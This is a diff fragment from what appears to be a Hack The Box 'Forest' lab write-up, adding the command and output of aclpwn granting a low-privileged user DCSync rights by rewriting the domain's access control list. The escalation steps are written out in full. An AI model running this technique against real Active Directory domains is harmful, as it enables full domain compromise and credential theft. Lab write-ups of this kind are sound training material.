@@ -345,5 +345,17 @@ Path: (ZER0CODE@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-
 [+] Path validated, the following modifications are required for exploitation in the current configuration:
 [-] Modifying domain DACL to give DCSync rights to ZER0CODE
 '''
+
+```markdown
+root@test:~/HTB/Forest# aclpwn -f zer0code -ft user -t 'HTB.LOCAL' -tt domain -d htb.local -s 10.10.10.161
+Please supply the password or LM:NTLM hashes of the account you are escalating from: 
+[+] Path found!
+Path: (ZER0CODE@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
+[-] Memberof -> continue
+[-] Modifying domain DACL to give DCSync rights to ZER0CODE
+[+] Dacl modification successful
+[+] Finished running tasks
+[+] Saved restore state to aclpwn-20200123-132645.restore
+```
 ## Resources:
 [https://securityonline.info/aclpwn/](https://securityonline.info/aclpwn/)
